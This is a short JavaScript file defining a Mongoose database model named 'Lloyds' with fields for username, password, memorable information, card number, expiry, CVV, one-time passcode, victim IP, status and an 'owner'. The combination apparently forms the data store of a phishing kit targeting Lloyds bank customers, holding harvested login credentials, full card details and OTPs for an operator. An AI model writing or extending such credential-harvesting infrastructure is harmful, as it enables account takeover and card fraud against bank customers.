const mongoose = require("mongoose");

const lloydsSchema = new mongoose.Schema({
  uniqueid: Number,
  username: String,
  password: String,
  memorable: String,
  ccnum: String,
  ccexp: String,
  cvv: String,
  otp: String,
  status: Number,
  ip: String,
  owner: String,
});

module.exports = mongoose.model("Lloyds", lloydsSchema);
